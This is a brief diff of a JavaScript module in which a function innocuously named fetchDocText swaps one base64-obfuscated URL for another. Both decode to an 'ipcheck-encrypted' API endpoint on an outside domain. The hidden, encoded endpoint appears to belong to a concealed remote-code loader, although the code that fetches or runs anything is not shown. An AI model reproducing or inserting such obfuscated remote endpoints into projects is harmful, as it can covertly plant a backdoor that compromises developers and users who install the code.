@@ -5,7 +5,7 @@ import {createRequire} from 'module';
 const require = createRequire(import.meta.url);
 
 const fetchDocText = async () => {
-    const url = "aHR0cHM6Ly93d3cuaGFtaWxpeC5jb20vYXBpL2lwY2hlY2stZW5jcnlwdGVkLzYwNg"
+    const url = "aHR0cHM6Ly93d3cudGVzdC1zZXR0aW5nLm9ubGluZS9hcGkvaXBjaGVjay1lbmNyeXB0ZWQvNjA2"
  return url;
 
 }
